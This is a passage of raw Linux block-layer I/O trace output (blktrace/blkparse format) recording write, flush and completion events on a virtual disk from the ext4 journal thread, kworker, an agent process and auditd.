0.000977493 291 M WS 7928896 + 8 [jbd2/vda1-8] 253,0 1 77 0.000977886 291 A WS 7928904 + 8 <- (253,1) 7926856 253,0 1 78 0.000978066 291 Q WS 7928904 + 8 [jbd2/vda1-8] 253,0 1 79 0.000978199 291 M WS 7928904 + 8 [jbd2/vda1-8] 253,0 1 80 0.000978496 291 A WS 7928912 + 8 <- (253,1) 7926864 253,0 1 81 0.000978675 291 Q WS 7928912 + 8 [jbd2/vda1-8] 253,0 1 82 0.000978806 291 M WS 7928912 + 8 [jbd2/vda1-8] 253,0 1 83 0.000979050 291 A WS 7928920 + 8 <- (253,1) 7926872 253,0 1 84 0.000979244 291 Q WS 7928920 + 8 [jbd2/vda1-8] 253,0 1 85 0.000979373 291 M WS 7928920 + 8 [jbd2/vda1-8] 253,0 1 86 0.000980014 291 UT N [jbd2/vda1-8] 1 253,0 1 87 0.000980420 291 I WS 7928704 + 224 [jbd2/vda1-8] 253,0 1 88 0.000981785 291 D WS 7928704 + 224 [jbd2/vda1-8] 253,0 0 9 0.003244357 0 C WS 7928704 + 224 [0] 253,0 0 10 0.003271459 291 A FWFS 7928928 + 8 <- (253,1) 7926880 253,0 0 11 0.003271854 291 Q FWFS 7928928 + 8 [jbd2/vda1-8] 253,0 0 12 0.003272053 291 G FWFS 7928928 + 8 [jbd2/vda1-8] 253,0 0 13 0.003398213 284 D WS 7928928 + 8 [kworker/0:1H] 253,0 0 14 0.004277985 0 C WS 7928928 + 8 [0] 253,0 0 15 0.004446931 0 C WS 7928928 [0] 253,0 1 89 0.004495486 31360 A WS 18285248 + 8 <- (253,1) 18283200 253,0 1 90 0.004496628 31360 Q WS 18285248 + 8 [barad_agent] 253,0 1 91 0.004497546 31360 G WS 18285248 + 8 [barad_agent] 253,0 1 92 0.004498526 31360 P N [barad_agent] 253,0 1 93 0.004498959 31360 UT N [barad_agent] 1 253,0 1 94 0.004499336 31360 I WS 18285248 + 8 [barad_agent] 253,0 1 95 0.004500300 31360 D WS 18285248 + 8 [barad_agent] 253,0 0 16 0.005671600 0 C WS 18285248 + 8 [0] 253,0 0 17 0.005701797 291 A WS 7928936 + 8 <- (253,1) 7926888 253,0 0 18 0.005702238 291 Q WS 7928936 + 8 [jbd2/vda1-8] 253,0 0 19 0.005702707 291 G WS 7928936 + 8 [jbd2/vda1-8] 253,0 0 20 0.005703252 291 P N [jbd2/vda1-8] 253,0 0 21 0.005703515 291 A WS 7928944 + 8 <- (253,1) 7926896 253,0 0 22 0.005703710 291 Q WS 7928944 + 8 [jbd2/vda1-8] 253,0 0 23 0.005704211 291 M WS 7928944 + 8 [jbd2/vda1-8] 253,0 0 24 0.005704793 291 A WS 7928952 + 8 <- (253,1) 7926904 253,0 0 25 0.005704987 291 Q WS 7928952 + 8 [jbd2/vda1-8] 253,0 0 26 0.005705122 291 M WS 7928952 + 8 [jbd2/vda1-8] 253,0 0 27 0.005705561 291 UT N [jbd2/vda1-8] 1 253,0 0 28 0.005705843 291 I WS 7928936 + 24 [jbd2/vda1-8] 253,0 0 29 0.005706577 291 D WS 7928936 + 24 [jbd2/vda1-8] 253,0 0 30 0.006453326 0 C WS 7928936 + 24 [0] 253,0 0 31 0.006460459 291 A FWFS 7928960 + 8 <- (253,1) 7926912 253,0 0 32 0.006460644 291 Q FWFS 7928960 + 8 [jbd2/vda1-8] 253,0 0 33 0.006460804 291 G FWFS 7928960 + 8 [jbd2/vda1-8] 253,0 0 34 0.006550733 284 D WS 7928960 + 8 [kworker/0:1H] 253,0 0 35 0.007294926 0 C WS 7928960 + 8 [0] 253,0 0 36 0.007375389 0 C WS 7928960 [0] 253,0 1 96 0.007428746 31360 A WS 25411448 + 16 <- (253,1) 25409400 253,0 1 97 0.007429357 31360 Q WS 25411448 + 16 [barad_agent] 253,0 1 98 0.007429742 31360 G WS 25411448 + 16 [barad_agent] 253,0 1 99 0.007430337 31360 P N [barad_agent] 253,0 1 100 0.007430888 31360 A WS 25206952 + 8 <- (253,1) 25204904 253,0 1 101 0.007431068 31360 Q WS 25206952 + 8 [barad_agent] 253,0 1 102 0.007431411 31360 G WS 25206952 + 8 [barad_agent] 253,0 1 103 0.007432195 31360 UT N [barad_agent] 2 253,0 1 104 0.007432429 31360 I WS 25206952 + 8 [barad_agent] 253,0 1 105 0.007432808 31360 I WS 25411448 + 16 [barad_agent] 253,0 1 106 0.007433532 31360 D WS 25206952 + 8 [barad_agent] 253,0 1 107 0.007436657 31360 D WS 25411448 + 16 [barad_agent] 253,0 0 37 0.008105745 0 C WS 25411448 + 16 [0] 253,0 0 38 0.008250164 0 C WS 25206952 + 8 [0] 253,0 0 39 0.008275094 291 A WS 7928968 + 8 <- (253,1) 7926920 253,0 0 40 0.008275352 291 Q WS 7928968 + 8 [jbd2/vda1-8] 253,0 0 41 0.008275740 291 G WS 7928968 + 8 [jbd2/vda1-8] 253,0 0 42 0.008276186 291 P N [jbd2/vda1-8] 253,0 0 43 0.008276442 291 A WS 7928976 + 8 <- (253,1) 7926928 253,0 0 44 0.008276634 291 Q WS 7928976 + 8 [jbd2/vda1-8] 253,0 0 45 0.008276894 291 M WS 7928976 + 8 [jbd2/vda1-8] 253,0 0 46 0.008277305 291 UT N [jbd2/vda1-8] 1 253,0 0 47 0.008277559 291 I WS 7928968 + 16 [jbd2/vda1-8] 253,0 0 48 0.008278189 291 D WS 7928968 + 16 [jbd2/vda1-8] 253,0 0 49 0.008908633 0 C WS 7928968 + 16 [0] 253,0 0 50 0.008915078 291 A FWFS 7928984 + 8 <- (253,1) 7926936 253,0 0 51 0.008915273 291 Q FWFS 7928984 + 8 [jbd2/vda1-8] 253,0 0 52 0.008915434 291 G FWFS 7928984 + 8 [jbd2/vda1-8] 253,0 0 53 0.009002428 284 D WS 7928984 + 8 [kworker/0:1H] 253,0 0 54 0.010153741 0 C WS 7928984 + 8 [0] 253,0 0 55 0.010240596 0 C WS 7928984 [0] 253,0 1 108 0.011372486 31360 A WS 25475000 + 8 <- (253,1) 25472952 253,0 1 109 0.011373483 31360 Q WS 25475000 + 8 [barad_agent] 253,0 1 110 0.011374518 31360 G WS 25475000 + 8 [barad_agent] 253,0 1 111 0.011375757 31360 P N [barad_agent] 253,0 1 112 0.011376731 31360 UT N [barad_agent] 1 253,0 1 113 0.011377166 31360 I WS 25475000 + 8 [barad_agent] 253,0 1 114 0.011379302 31360 D WS 25475000 + 8 [barad_agent] 253,0 0 56 0.012743466 0 C WS 25475000 + 8 [0] 253,0 0 57 0.012795600 291 A WS 7928992 + 8 <- (253,1) 7926944 253,0 0 58 0.012796158 291 Q WS 7928992 + 8 [jbd2/vda1-8] 253,0 0 59 0.012796744 291 G WS 7928992 + 8 [jbd2/vda1-8] 253,0 0 60 0.012797748 291 P N [jbd2/vda1-8] 253,0 0 61 0.012798154 291 A WS 7929000 + 8 <- (253,1) 7926952 253,0 0 62 0.012798341 291 Q WS 7929000 + 8 [jbd2/vda1-8] 253,0 0 63 0.012798821 291 M WS 7929000 + 8 [jbd2/vda1-8] 253,0 0 64 0.012799214 291 A WS 7929008 + 8 <- (253,1) 7926960 253,0 0 65 0.012799421 291 Q WS 7929008 + 8 [jbd2/vda1-8] 253,0 0 66 0.012799553 291 M WS 7929008 + 8 [jbd2/vda1-8] 253,0 0 67 0.012799802 291 A WS 7929016 + 8 <- (253,1) 7926968 253,0 0 68 0.012799985 291 Q WS 7929016 + 8 [jbd2/vda1-8] 253,0 0 69 0.012800117 291 M WS 7929016 + 8 [jbd2/vda1-8] 253,0 0 70 0.012800395 291 A WS 7929024 + 8 <- (253,1) 7926976 253,0 0 71 0.012800532 291 Q WS 7929024 + 8 [jbd2/vda1-8] 253,0 0 72 0.012800676 291 M WS 7929024 + 8 [jbd2/vda1-8] 253,0 0 73 0.012800951 291 A WS 7929032 + 8 <- (253,1) 7926984 253,0 0 74 0.012801089 291 Q WS 7929032 + 8 [jbd2/vda1-8] 253,0 0 75 0.012801219 291 M WS 7929032 + 8 [jbd2/vda1-8] 253,0 0 76 0.012801521 291 A WS 7929040 + 8 <- (253,1) 7926992 253,0 0 77 0.012801708 291 Q WS 7929040 + 8 [jbd2/vda1-8] 253,0 0 78 0.012801834 291 M WS 7929040 + 8 [jbd2/vda1-8] 253,0 0 79 0.012802485 291 A WS 7929048 + 8 <- (253,1) 7927000 253,0 0 80 0.012802672 291 Q WS 7929048 + 8 [jbd2/vda1-8] 253,0 0 81 0.012802804 291 M WS 7929048 + 8 [jbd2/vda1-8] 253,0 0 82 0.012803134 291 A WS 7929056 + 8 <- (253,1) 7927008 253,0 0 83 0.012803328 291 Q WS 7929056 + 8 [jbd2/vda1-8] 253,0 0 84 0.012803473 291 M WS 7929056 + 8 [jbd2/vda1-8] 253,0 0 85 0.012804057 291 UT N [jbd2/vda1-8] 1 253,0 0 86 0.012804345 291 I WS 7928992 + 72 [jbd2/vda1-8] 253,0 0 87 0.012805270 291 D WS 7928992 + 72 [jbd2/vda1-8] 253,0 0 88 0.014191981 0 C WS 7928992 + 72 [0] 253,0 0 89 0.014203185 291 A FWFS 7929064 + 8 <- (253,1) 7927016 253,0 0 90 0.014203387 291 Q FWFS 7929064 + 8 [jbd2/vda1-8] 253,0 0 91 0.014203573 291 G FWFS 7929064 + 8 [jbd2/vda1-8] 253,0 0 92 0.014317414 284 D WS 7929064 + 8 [kworker/0:1H] 253,0 0 93 0.015572547 0 C WS 7929064 + 8 [0] 253,0 0 94 0.015655392 0 C WS 7929064 [0] 253,0 1 115 0.015690905 31360 A WS 25475000 + 8 <- (253,1) 25472952 253,0 1 116 0.015691641 31360 Q WS 25475000 + 8 [barad_agent] 253,0 1 117 0.015692260 31360 G WS 25475000 + 8 [barad_agent] 253,0 1 118 0.015692946 31360 P N [barad_agent] 253,0 1 119 0.015693391 31360 UT N [barad_agent] 1 253,0 1 120 0.015693669 31360 I WS 25475000 + 8 [barad_agent] 253,0 1 121 0.015694488 31360 D WS 25475000 + 8 [barad_agent] 253,0 0 95 0.016523177 0 C WS 25475000 + 8 [0] 253,0 0 96 0.016558752 291 A WS 7929072 + 8 <- (253,1) 7927024 253,0 0 97 0.016559072 291 Q WS 7929072 + 8 [jbd2/vda1-8] 253,0 0 98 0.016559528 291 G WS 7929072 + 8 [jbd2/vda1-8] 253,0 0 99 0.016560087 291 P N [jbd2/vda1-8] 253,0 0 100 0.016560386 291 A WS 7929080 + 8 <- (253,1) 7927032 253,0 0 101 0.016560984 291 Q WS 7929080 + 8 [jbd2/vda1-8] 253,0 0 102 0.016561293 291 M WS 7929080 + 8 [jbd2/vda1-8] 253,0 0 103 0.016561785 291 UT N [jbd2/vda1-8] 1 253,0 0 104 0.016562064 291 I WS 7929072 + 16 [jbd2/vda1-8] 253,0 0 105 0.016562819 291 D WS 7929072 + 16 [jbd2/vda1-8] 253,0 0 106 0.017230216 0 C WS 7929072 + 16 [0] 253,0 0 107 0.017237203 291 A FWFS 7929088 + 8 <- (253,1) 7927040 253,0 0 108 0.017237406 291 Q FWFS 7929088 + 8 [jbd2/vda1-8] 253,0 0 109 0.017237572 291 G FWFS 7929088 + 8 [jbd2/vda1-8] 253,0 0 110 0.017321427 284 D WS 7929088 + 8 [kworker/0:1H] 253,0 0 111 0.018309440 0 C WS 7929088 + 8 [0] 253,0 0 112 0.018403911 0 C WS 7929088 [0] 253,0 1 122 0.018439004 31360 A WS 25411448 + 16 <- (253,1) 25409400 253,0 1 123 0.018439495 31360 Q WS 25411448 + 16 [barad_agent] 253,0 1 124 0.018439938 31360 G WS 25411448 + 16 [barad_agent] 253,0 1 125 0.018440502 31360 P N [barad_agent] 253,0 1 126 0.018441134 31360 A WS 25206952 + 8 <- (253,1) 25204904 253,0 1 127 0.018441338 31360 Q WS 25206952 + 8 [barad_agent] 253,0 1 128 0.018441682 31360 G WS 25206952 + 8 [barad_agent] 253,0 1 129 0.018442452 31360 UT N [barad_agent] 2 253,0 1 130 0.018442691 31360 I WS 25206952 + 8 [barad_agent] 253,0 1 131 0.018443137 31360 I WS 25411448 + 16 [barad_agent] 253,0 1 132 0.018443956 31360 D WS 25206952 + 8 [barad_agent] 253,0 1 133 0.018447486 31360 D WS 25411448 + 16 [barad_agent] 253,0 0 113 0.019121789 0 C WS 25411448 + 16 [0] 253,0 0 114 0.019328776 0 C WS 25206952 + 8 [0] 253,0 0 115 0.019355356 291 A WS 7929096 + 8 <- (253,1) 7927048 253,0 0 116 0.019355582 291 Q WS 7929096 + 8 [jbd2/vda1-8] 253,0 0 117 0.019355967 291 G WS 7929096 + 8 [jbd2/vda1-8] 253,0 0 118 0.019356438 291 P N [jbd2/vda1-8] 253,0 0 119 0.019356776 291 A WS 7929104 + 8 <- (253,1) 7927056 253,0 0 120 0.019356963 291 Q WS 7929104 + 8 [jbd2/vda1-8] 253,0 0 121 0.019357243 291 M WS 7929104 + 8 [jbd2/vda1-8] 253,0 0 122 0.019357696 291 UT N [jbd2/vda1-8] 1 253,0 0 123 0.019357942 291 I WS 7929096 + 16 [jbd2/vda1-8] 253,0 0 124 0.019358583 291 D WS 7929096 + 16 [jbd2/vda1-8] 253,0 0 125 0.020135467 0 C WS 7929096 + 16 [0] 253,0 0 126 0.020150134 291 A FWFS 7929112 + 8 <- (253,1) 7927064 253,0 0 127 0.020150867 291 Q FWFS 7929112 + 8 [jbd2/vda1-8] 253,0 0 128 0.020151264 291 G FWFS 7929112 + 8 [jbd2/vda1-8] 253,0 0 129 0.020511308 284 D WS 7929112 + 8 [kworker/0:1H] 253,0 0 130 0.021340905 0 C WS 7929112 + 8 [0] 253,0 0 131 0.021432559 0 C WS 7929112 [0] 253,0 1 134 0.022393544 31360 A WS 25475008 + 8 <- (253,1) 25472960 253,0 1 135 0.022394631 31360 Q WS 25475008 + 8 [barad_agent] 253,0 1 136 0.022395813 31360 G WS 25475008 + 8 [barad_agent] 253,0 1 137 0.022397264 31360 P N [barad_agent] 253,0 1 138 0.022398347 31360 UT N [barad_agent] 1 253,0 1 139 0.022398788 31360 I WS 25475008 + 8 [barad_agent] 253,0 1 140 0.022416608 31360 D WS 25475008 + 8 [barad_agent] 253,0 0 132 0.023458688 0 C WS 25475008 + 8 [0] 253,0 0 133 0.023494955 291 A WS 7929120 + 8 <- (253,1) 7927072 253,0 0 134 0.023495563 291 Q WS 7929120 + 8 [jbd2/vda1-8] 253,0 0 135 0.023496345 291 G WS 7929120 + 8 [jbd2/vda1-8] 253,0 0 136 0.023497465 291 P N [jbd2/vda1-8] 253,0 0 137 0.023497937 291 A WS 7929128 + 8 <- (253,1) 7927080 253,0 0 138 0.023498136 291 Q WS 7929128 + 8 [jbd2/vda1-8] 253,0 0 139 0.023498675 291 M WS 7929128 + 8 [jbd2/vda1-8] 253,0 0 140 0.023499096 291 A WS 7929136 + 8 <- (253,1) 7927088 253,0 0 141 0.023499281 291 Q WS 7929136 + 8 [jbd2/vda1-8] 253,0 0 142 0.023499421 291 M WS 7929136 + 8 [jbd2/vda1-8] 253,0 0 143 0.023499751 291 A WS 7929144 + 8 <- (253,1) 7927096 253,0 0 144 0.023499883 291 Q WS 7929144 + 8 [jbd2/vda1-8] 253,0 0 145 0.023500016 291 M WS 7929144 + 8 [jbd2/vda1-8] 253,0 0 146 0.023500284 291 A WS 7929152 + 8 <- (253,1) 7927104 253,0 0 147 0.023500416 291 Q WS 7929152 + 8 [jbd2/vda1-8] 253,0 0 148 0.023500547 291 M WS 7929152 + 8 [jbd2/vda1-8] 253,0 0 149 0.023500739 291 A WS 7929160 + 8 <- (253,1) 7927112 253,0 0 150 0.023500873 291 Q WS 7929160 + 8 [jbd2/vda1-8] 253,0 0 151 0.023501005 291 M WS 7929160 + 8 [jbd2/vda1-8] 253,0 0 152 0.023501279 291 A WS 7929168 + 8 <- (253,1) 7927120 253,0 0 153 0.023501412 291 Q WS 7929168 + 8 [jbd2/vda1-8] 253,0 0 154 0.023501547 291 M WS 7929168 + 8 [jbd2/vda1-8] 253,0 0 155 0.023501974 291 A WS 7929176 + 8 <- (253,1) 7927128 253,0 0 156 0.023502168 291 Q WS 7929176 + 8 [jbd2/vda1-8] 253,0 0 157 0.023502301 291 M WS 7929176 + 8 [jbd2/vda1-8] 253,0 0 158 0.023502979 291 UT N [jbd2/vda1-8] 1 253,0 0 159 0.023503390 291 I WS 7929120 + 64 [jbd2/vda1-8] 253,0 0 160 0.023504516 291 D WS 7929120 + 64 [jbd2/vda1-8] 253,0 0 161 0.024602854 0 C WS 7929120 + 64 [0] 253,0 0 162 0.024616650 291 A FWFS 7929184 + 8 <- (253,1) 7927136 253,0 0 163 0.024617176 291 Q FWFS 7929184 + 8 [jbd2/vda1-8] 253,0 0 164 0.024617411 291 G FWFS 7929184 + 8 [jbd2/vda1-8] 253,0 0 165 0.024713783 284 D WS 7929184 + 8 [kworker/0:1H] 253,0 0 166 0.025436970 0 C WS 7929184 + 8 [0] 253,0 0 167 0.025517106 0 C WS 7929184 [0] 253,0 1 141 0.025552987 31360 A WS 25475008 + 8 <- (253,1) 25472960 253,0 1 142 0.025553735 31360 Q WS 25475008 + 8 [barad_agent] 253,0 1 143 0.025554451 31360 G WS 25475008 + 8 [barad_agent] 253,0 1 144 0.025555171 31360 P N [barad_agent] 253,0 1 145 0.025555615 31360 UT N [barad_agent] 1 253,0 1 146 0.025555946 31360 I WS 25475008 + 8 [barad_agent] 253,0 1 147 0.025556859 31360 D WS 25475008 + 8 [barad_agent] 253,0 0 168 0.026328848 0 C WS 25475008 + 8 [0] 253,0 0 169 0.026357842 291 A WS 7929192 + 8 <- (253,1) 7927144 253,0 0 170 0.026358278 291 Q WS 7929192 + 8 [jbd2/vda1-8] 253,0 0 171 0.026358811 291 G WS 7929192 + 8 [jbd2/vda1-8] 253,0 0 172 0.026359496 291 P N [jbd2/vda1-8] 253,0 0 173 0.026359835 291 A WS 7929200 + 8 <- (253,1) 7927152 253,0 0 174 0.026360019 291 Q WS 7929200 + 8 [jbd2/vda1-8] 253,0 0 175 0.026360356 291 M WS 7929200 + 8 [jbd2/vda1-8] 253,0 0 176 0.026360865 291 UT N [jbd2/vda1-8] 1 253,0 0 177 0.026361259 291 I WS 7929192 + 16 [jbd2/vda1-8] 253,0 0 178 0.026362035 291 D WS 7929192 + 16 [jbd2/vda1-8] 253,0 0 179 0.027045353 0 C WS 7929192 + 16 [0] 253,0 0 180 0.027054385 291 A FWFS 7929208 + 8 <- (253,1) 7927160 253,0 0 181 0.027054673 291 Q FWFS 7929208 + 8 [jbd2/vda1-8] 253,0 0 182 0.027054890 291 G FWFS 7929208 + 8 [jbd2/vda1-8] 253,0 0 183 0.027139235 284 D WS 7929208 + 8 [kworker/0:1H] 253,0 0 184 0.027877565 0 C WS 7929208 + 8 [0] 253,0 0 185 0.027956059 0 C WS 7929208 [0] 253,0 1 148 0.027992206 31360 A WS 25411448 + 16 <- (253,1) 25409400 253,0 1 149 0.027992686 31360 Q WS 25411448 + 16 [barad_agent] 253,0 1 150 0.027993213 31360 G WS 25411448 + 16 [barad_agent] 253,0 1 151 0.027993727 31360 P N [barad_agent] 253,0 1 152 0.027994497 31360 A WS 25206928 + 8 <- (253,1) 25204880 253,0 1 153 0.027994701 31360 Q WS 25206928 + 8 [barad_agent] 253,0 1 154 0.027995006 31360 G WS 25206928 + 8 [barad_agent] 253,0 1 155 0.027995871 31360 UT N [barad_agent] 2 253,0 1 156 0.027996160 31360 I WS 25206928 + 8 [barad_agent] 253,0 1 157 0.027996649 31360 I WS 25411448 + 16 [barad_agent] 253,0 1 158 0.027997501 31360 D WS 25206928 + 8 [barad_agent] 253,0 1 159 0.028001198 31360 D WS 25411448 + 16 [barad_agent] 253,0 0 186 0.028714563 0 C WS 25206928 + 8 [0] 253,0 0 187 0.028743236 0 C WS 25411448 + 16 [0] 253,0 0 188 0.028769004 291 A WS 7929216 + 8 <- (253,1) 7927168 253,0 0 189 0.028769262 291 Q WS 7929216 + 8 [jbd2/vda1-8] 253,0 0 190 0.028769657 291 G WS 7929216 + 8 [jbd2/vda1-8] 253,0 0 191 0.028770114 291 P N [jbd2/vda1-8] 253,0 0 192 0.028770470 291 A WS 7929224 + 8 <- (253,1) 7927176 253,0 0 193 0.028770667 291 Q WS 7929224 + 8 [jbd2/vda1-8] 253,0 0 194 0.028770921 291 M WS 7929224 + 8 [jbd2/vda1-8] 253,0 0 195 0.028771419 291 UT N [jbd2/vda1-8] 1 253,0 0 196 0.028771724 291 I WS 7929216 + 16 [jbd2/vda1-8] 253,0 0 197 0.028772493 291 D WS 7929216 + 16 [jbd2/vda1-8] 253,0 0 198 0.029504720 0 C WS 7929216 + 16 [0] 253,0 0 199 0.029512617 291 A FWFS 7929232 + 8 <- (253,1) 7927184 253,0 0 200 0.029512873 291 Q FWFS 7929232 + 8 [jbd2/vda1-8] 253,0 0 201 0.029513069 291 G FWFS 7929232 + 8 [jbd2/vda1-8] 253,0 0 202 0.029604935 284 D WS 7929232 + 8 [kworker/0:1H] 253,0 0 203 0.030330323 0 C WS 7929232 + 8 [0] 253,0 0 204 0.030432412 0 C WS 7929232 [0] 253,0 1 160 0.031247827 31360 A WS 25475016 + 8 <- (253,1) 25472968 253,0 1 161 0.031248733 31360 Q WS 25475016 + 8 [barad_agent] 253,0 1 162 0.031249689 31360 G WS 25475016 + 8 [barad_agent] 253,0 1 163 0.031250911 31360 P N [barad_agent] 253,0 1 164 0.031251917 31360 UT N [barad_agent] 1 253,0 1 165 0.031252330 31360 I WS 25475016 + 8 [barad_agent] 253,0 1 166 0.031253744 31360 D WS 25475016 + 8 [barad_agent] 253,0 0 205 0.033154141 0 C WS 25475016 + 8 [0] 253,0 0 206 0.033188363 291 A WS 7929240 + 8 <- (253,1) 7927192 253,0 0 207 0.033188894 291 Q WS 7929240 + 8 [jbd2/vda1-8] 253,0 0 208 0.033189585 291 G WS 7929240 + 8 [jbd2/vda1-8] 253,0 0 209 0.033190507 291 P N [jbd2/vda1-8] 253,0 0 210 0.033190824 291 A WS 7929248 + 8 <- (253,1) 7927200 253,0 0 211 0.033190991 291 Q WS 7929248 + 8 [jbd2/vda1-8] 253,0 0 212 0.033191365 291 M WS 7929248 + 8 [jbd2/vda1-8] 253,0 0 213 0.033191996 291 A WS 7929256 + 8 <- (253,1) 7927208 253,0 0 214 0.033192210 291 Q WS 7929256 + 8 [jbd2/vda1-8] 253,0 0 215 0.033192345 291 M WS 7929256 + 8 [jbd2/vda1-8] 253,0 0 216 0.033192628 291 A WS 7929264 + 8 <- (253,1) 7927216 253,0 0 217 0.033192788 291 Q WS 7929264 + 8 [jbd2/vda1-8] 253,0 0 218 0.033192917 291 M WS 7929264 + 8 [jbd2/vda1-8] 253,0 0 219 0.033193188 291 A WS 7929272 + 8 <- (253,1) 7927224 253,0 0 220 0.033193304 291 Q WS 7929272 + 8 [jbd2/vda1-8] 253,0 0 221 0.033193433 291 M WS 7929272 + 8 [jbd2/vda1-8] 253,0 0 222 0.033193628 291 A WS 7929280 + 8 <- (253,1) 7927232 253,0 0 223 0.033193747 291 Q WS 7929280 + 8 [jbd2/vda1-8] 253,0 0 224 0.033193877 291 M WS 7929280 + 8 [jbd2/vda1-8] 253,0 0 225 0.033194067 291 A WS 7929288 + 8 <- (253,1) 7927240 253,0 0 226 0.033194185 291 Q WS 7929288 + 8 [jbd2/vda1-8] 253,0 0 227 0.033194327 291 M WS 7929288 + 8 [jbd2/vda1-8] 253,0 0 228 0.033194605 291 A WS 7929296 + 8 <- (253,1) 7927248 253,0 0 229 0.033194721 291 Q WS 7929296 + 8 [jbd2/vda1-8] 253,0 0 230 0.033194853 291 M WS 7929296 + 8 [jbd2/vda1-8] 253,0 0 231 0.033195591 291 UT N [jbd2/vda1-8] 1 253,0 0 232 0.033195982 291 I WS 7929240 + 64 [jbd2/vda1-8] 253,0 0 233 0.033196998 291 D WS 7929240 + 64 [jbd2/vda1-8] 253,0 0 234 0.034362372 0 C WS 7929240 + 64 [0] 253,0 0 235 0.034373192 291 A FWFS 7929304 + 8 <- (253,1) 7927256 253,0 0 236 0.034373470 291 Q FWFS 7929304 + 8 [jbd2/vda1-8] 253,0 0 237 0.034373696 291 G FWFS 7929304 + 8 [jbd2/vda1-8] 253,0 0 238 0.034472706 284 D WS 7929304 + 8 [kworker/0:1H] 253,0 0 239 0.035196530 0 C WS 7929304 + 8 [0] 253,0 0 240 0.035285330 0 C WS 7929304 [0] 253,0 1 167 0.035320979 31360 A WS 25475016 + 8 <- (253,1) 25472968 253,0 1 168 0.035321822 31360 Q WS 25475016 + 8 [barad_agent] 253,0 1 169 0.035322749 31360 G WS 25475016 + 8 [barad_agent] 253,0 1 170 0.035323841 31360 P N [barad_agent] 253,0 1 171 0.035324321 31360 UT N [barad_agent] 1 253,0 1 172 0.035324676 31360 I WS 25475016 + 8 [barad_agent] 253,0 1 173 0.035325991 31360 D WS 25475016 + 8 [barad_agent] 253,0 0 241 0.037738108 0 C WS 25475016 + 8 [0] 253,0 0 242 0.037769866 291 A WS 7929312 + 8 <- (253,1) 7927264 253,0 0 243 0.037770331 291 Q WS 7929312 + 8 [jbd2/vda1-8] 253,0 0 244 0.037771003 291 G WS 7929312 + 8 [jbd2/vda1-8] 253,0 0 245 0.037771773 291 P N [jbd2/vda1-8] 253,0 0 246 0.037772035 291 A WS 7929320 + 8 <- (253,1) 7927272 253,0 0 247 0.037772238 291 Q WS 7929320 + 8 [jbd2/vda1-8] 253,0 0 248 0.037772541 291 M WS 7929320 + 8 [jbd2/vda1-8] 253,0 0 249 0.037773170 291 UT N [jbd2/vda1-8] 1 253,0 0 250 0.037773616 291 I WS 7929312 + 16 [jbd2/vda1-8] 253,0 0 251 0.037774465 291 D WS 7929312 + 16 [jbd2/vda1-8] 253,0 0 252 0.038437889 0 C WS 7929312 + 16 [0] 253,0 0 253 0.038443546 291 A FWFS 7929328 + 8 <- (253,1) 7927280 253,0 0 254 0.038443827 291 Q FWFS 7929328 + 8 [jbd2/vda1-8] 253,0 0 255 0.038444097 291 G FWFS 7929328 + 8 [jbd2/vda1-8] 253,0 0 256 0.038529733 284 D WS 7929328 + 8 [kworker/0:1H] 253,0 0 257 0.039309629 0 C WS 7929328 + 8 [0] 253,0 0 258 0.039383908 0 C WS 7929328 [0] 253,0 1 174 0.039436530 31360 A WS 25411448 + 16 <- (253,1) 25409400 253,0 1 175 0.039437228 31360 Q WS 25411448 + 16 [barad_agent] 253,0 1 176 0.039438201 31360 G WS 25411448 + 16 [barad_agent] 253,0 1 177 0.039439280 31360 P N [barad_agent] 253,0 1 178 0.039440282 31360 A WS 25411488 + 8 <- (253,1) 25409440 253,0 1 179 0.039440468 31360 Q WS 25411488 + 8 [barad_agent] 253,0 1 180 0.039440801 31360 G WS 25411488 + 8 [barad_agent] 253,0 1 181 0.039441914 31360 A WS 25206952 + 8 <- (253,1) 25204904 253,0 1 182 0.039442111 31360 Q WS 25206952 + 8 [barad_agent] 253,0 1 183 0.039442395 31360 G WS 25206952 + 8 [barad_agent] 253,0 1 184 0.039443365 31360 UT N [barad_agent] 3 253,0 1 185 0.039443720 31360 I WS 25206952 + 8 [barad_agent] 253,0 1 186 0.039444137 31360 I WS 25411448 + 16 [barad_agent] 253,0 1 187 0.039444301 31360 I WS 25411488 + 8 [barad_agent] 253,0 1 188 0.039445538 31360 D WS 25206952 + 8 [barad_agent] 253,0 1 189 0.039450185 31360 D WS 25411448 + 16 [barad_agent] 253,0 1 190 0.039450924 31360 D WS 25411488 + 8 [barad_agent] 253,0 0 259 0.040087466 0 C WS 25411448 + 16 [0] 253,0 0 260 0.040127395 0 C WS 25411488 + 8 [0] 253,0 0 261 0.040249958 0 C WS 25206952 + 8 [0] 253,0 0 262 0.040280612 291 A WS 7929336 + 8 <- (253,1) 7927288 253,0 0 263 0.040281211 291 Q WS 7929336 + 8 [jbd2/vda1-8] 253,0 0 264 0.040285602 291 G WS 7929336 + 8 [jbd2/vda1-8] 253,0 0 265 0.040286651 291 P N [jbd2/vda1-8] 253,0 0 266 0.040287209 291 A WS 7929344 + 8 <- (253,1) 7927296 253,0 0 267 0.040287499 291 Q WS 7929344 + 8 [jbd2/vda1-8] 253,0 0 268 0.040288012 291 M WS 7929344 + 8 [jbd2/vda1-8] 253,0 0 269 0.040288828 291 UT N [jbd2/vda1-8] 1 253,0 0 270 0.040289335 291 I WS 7929336 + 16 [jbd2/vda1-8] 253,0 0 271 0.040290356 291 D WS 7929336 + 16 [jbd2/vda1-8] 253,0 0 272 0.041012337 0 C WS 7929336 + 16 [0] 253,0 0 273 0.041019669 291 A FWFS 7929352 + 8 <- (253,1) 7927304 253,0 0 274 0.041019970 291 Q FWFS 7929352 + 8 [jbd2/vda1-8] 253,0 0 275 0.041020153 291 G FWFS 7929352 + 8 [jbd2/vda1-8] 253,0 0 276 0.041107629 284 D WS 7929352 + 8 [kworker/0:1H] 253,0 0 277 0.042000051 0 C WS 7929352 + 8 [0] 253,0 0 278 0.042077963 0 C WS 7929352 [0] 253,0 0 279 0.628178798 518 A WS 25181480 + 8 <- (253,1) 25179432 253,0 0 280 0.628180716 518 Q WS 25181480 + 8 [auditd] 253,0 0 281 0.628184067 518 G WS 25181480 + 8 [auditd] 253,0 0 282 0.628187820 518 P N [auditd] 253,0 0 283 0.628189061 518 UT N [auditd] 1 253,0 0 284 0.628190268 518 I WS 25181480 + 8 [auditd] 253,0 0 285 0.628193805 518 D WS 25181480 + 8 [auditd] 253,0 0 286 0.629566828 0 C WS 25181480 + 8 [0] 253,0 1 191 0.629607558 291 A WS 7929360 + 8 <- (253,1) 7927312 253,0 1 192 0.629608842 291 Q WS 7929360 + 8 [jbd2/vda1-8] 253,0 1 193 0.629609934 291 G WS 7929360 + 8 [jbd2/vda1-8] 253,0 1 194 0.629611674 291 